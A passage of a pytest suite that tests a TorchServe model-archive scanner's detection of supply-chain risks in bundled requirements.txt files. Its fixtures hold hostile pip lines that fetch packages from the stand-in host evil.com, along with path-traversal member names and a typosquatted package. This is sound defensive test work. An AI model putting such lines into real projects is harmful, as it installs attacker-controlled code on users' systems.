        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-ihttps://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_evil_index_concatenated_short.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_editable_git_requirements_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-e git+https://evil.com/repo#egg=evilpkg\n",
        },
        filename="requirements_editable_git.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
    assert "editable_install" in reasons
    assert "git_install" in reasons


def test_scan_flags_editable_equals_git_requirements_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--editable=git+https://evil.com/repo#egg=evilpkg\n",
        },
        filename="requirements_editable_equals_git.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
    assert "editable_install" in reasons
    assert "git_install" in reasons


def test_scan_flags_remote_find_links_equals_and_short_forms_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_equals_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--find-links=https://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_find_links_equals.mar",
    )
    mar_short_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-f https://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_find_links_short.mar",
    )
    mar_concatenated_short_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-fhttps://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_find_links_concatenated_short.mar",
    )

    equals_result = TorchServeMarScanner().scan(str(mar_equals_path))
    short_result = TorchServeMarScanner().scan(str(mar_short_path))
    concatenated_short_result = TorchServeMarScanner().scan(str(mar_concatenated_short_path))

    for result in (equals_result, short_result, concatenated_short_result):
        requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
        assert len(requirements_failures) == 1
        reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
        assert "remote_find_links" in reasons


def test_scan_accepts_clean_requirements_txt(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"numpy==1.26.4\ntorch==2.2.2\n",
        },
        filename="requirements_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_flags_colliding_requirements_txt_member_even_when_benign_alias_is_last(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
            ("subdir/../requirements.txt", b"numpy==1.26.4\n"),
        ],
        filename="requirements_collision_override.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert any(
        finding["reason"] == "git_install" and finding["requirements_file"] == "requirements.txt"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_core_scan_keeps_colliding_requirements_alias_findings_flat(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
            ("subdir/../requirements.txt", b"numpy==1.26.4\n"),
        ],
        filename="requirements_collision_core_flat.mar",
    )

    result = core.scan_file(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
    failed_checks = [check for check in requirements_checks if check.status == CheckStatus.FAILED]

    assert len(requirements_checks) == 2
    assert len(failed_checks) == 1
    assert failed_checks[0].details["zip_entry"] == "requirements.txt"
    assert all("reason" in finding for finding in failed_checks[0].details.get("findings", []))


def test_scan_accepts_clean_colliding_requirements_txt_aliases(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"numpy==1.26.4\n"),
            ("subdir/../requirements.txt", b"torch==2.2.2\n"),
        ],
        filename="requirements_collision_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 2
    assert all(check.status == CheckStatus.PASSED for check in requirements_checks)


def test_scan_ignores_inline_comment_urls_in_safe_requirements(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"numpy==1.26.4  # docs http://example.com\n",
        },
        filename="requirements_comment_url.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_accepts_local_find_links_and_pypi_short_index(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": (
                b"-i https://pypi.org/simple\n"
                b"--extra-index-url=https://files.pythonhosted.org/simple\n"
                b"--find-links file:///opt/wheels\n"
                b"numpy==1.26.4\n"
            ),
        },
        filename="requirements_local_find_links.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_accepts_local_direct_url_requirement(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"torch @ file:///opt/wheels/torch.whl\n",
        },
        filename="requirements_local_direct_url.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_analyzes_local_included_requirements_files(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-r extra.txt\n",
            "extra.txt": b"--index-url=https://evil.com/simple\n",
        },
        filename="requirements_local_include.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" and finding["requirements_file"] == "extra.txt"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_colliding_local_requirements_include_even_when_benign_alias_is_last(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"-r extra.txt\n"),
            ("extra.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
            ("subdir/../extra.txt", b"numpy==1.26.4\n"),
        ],
        filename="requirements_local_include_collision_override.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert any(
        finding["reason"] == "git_install" and finding["requirements_file"] == "extra.txt"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_follows_local_requirements_include_beyond_entry_processing_cap(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"-r extra.txt\n"),
            ("extra.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
        ],
        filename="requirements_include_after_entry_cap.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_entries": 4}).scan(str(mar_path))

    entry_limit_failures = _failed_checks(result, "TorchServe MAR Entry Limit")
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(entry_limit_failures) == 1
    assert len(requirements_failures) == 1
    assert any(
        finding["reason"] == "git_install" and finding["requirements_file"] == "extra.txt"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_accepts_clean_colliding_local_requirements_include_aliases(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"-r extra.txt\n"),
            ("extra.txt", b"numpy==1.26.4\n"),
            ("subdir/../extra.txt", b"torch==2.2.2\n"),
        ],
        filename="requirements_local_include_collision_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


@pytest.mark.parametrize(
    ("requirements_line", "filename"),
    [
        ("-r ../outside.txt\n", "requirements_parent_relative_include.mar"),
        ("-r /workspace/outside.txt\n", "requirements_absolute_include.mar"),
        ("-r file:///workspace/outside.txt\n", "requirements_file_url_include.mar"),
    ],
)
def test_scan_flags_external_local_requirements_include_as_warning(
    tmp_path: Path,
    requirements_line: str,
    filename: str,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": requirements_line.encode("utf-8"),
        },
        filename=filename,
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "external_requirements_include"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_accepts_clean_local_included_requirements_files(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-r extras/clean.txt\n",
            "extras/clean.txt": b"numpy==1.26.4\n",
        },
        filename="requirements_clean_local_include.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_flags_remote_requirements_include_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-r https://evil.com/requirements.txt\n",
        },
        filename="requirements_remote_include.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "remote_requirements_include"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_direct_url_requirement_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"torch @ https://evil.com/pkg.whl\n",
        },
        filename="requirements_direct_url.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "direct_url_install" for finding in requirements_failures[0].details.get("findings", [])
    )


@pytest.mark.parametrize(
    ("requirements_line", "filename"),
    [
        ("-e.\n", "requirements_editable_current_dir.mar"),
        ("-e./pkg\n", "requirements_editable_pkg_dir.mar"),
    ],
)
def test_scan_flags_concatenated_editable_short_requirements_as_warning(
    tmp_path: Path,
    requirements_line: str,
    filename: str,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": requirements_line.encode("utf-8"),
        },
        filename=filename,
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "editable_install" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_bare_direct_url_with_userinfo_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"https://user:pass@evil.com/pkg.whl\n",
        },
        filename="requirements_bare_userinfo_direct_url.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "direct_url_install" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_ignores_missing_index_url_value(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--index-url\nnumpy==1.26.4\n",
        },
        filename="requirements_missing_index_value.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_bounds_requirements_reads_to_dedicated_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    monkeypatch.setattr(TorchServeMarScanner, "MAX_REQUIREMENTS_TXT_BYTES", 128)
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"a" * 129,
        },
        filename="requirements_oversized.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_member_bytes": 1024 * 1024}).scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert any(
        finding["reason"] == "requirements_read_error" and "exceeds size limit" in finding["message"]
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_without_requirements_txt_preserves_existing_behavior(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
        },
        filename="requirements_missing.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = [
        check for check in result.checks if check.name == "TorchServe Requirements Supply Chain Analysis"
    ]
    assert requirements_checks == []


def test_scan_only_analyzes_exact_requirements_txt_filename(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "myrequirements.txt": b"--index-url=https://evil.com/simple\n",
        },
        filename="requirements_filename_prefix.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = [
        check for check in result.checks if check.name == "TorchServe Requirements Supply Chain Analysis"
    ]
    assert requirements_checks == []


def test_scan_detects_typo_package_with_inline_hash_comment(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"numppy#comment\n",
        },
        filename="requirements_typo_hash_comment.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert any(
        finding["reason"] == "typosquatting_pattern" for finding in requirements_failures[0].details.get("findings", [])
    )
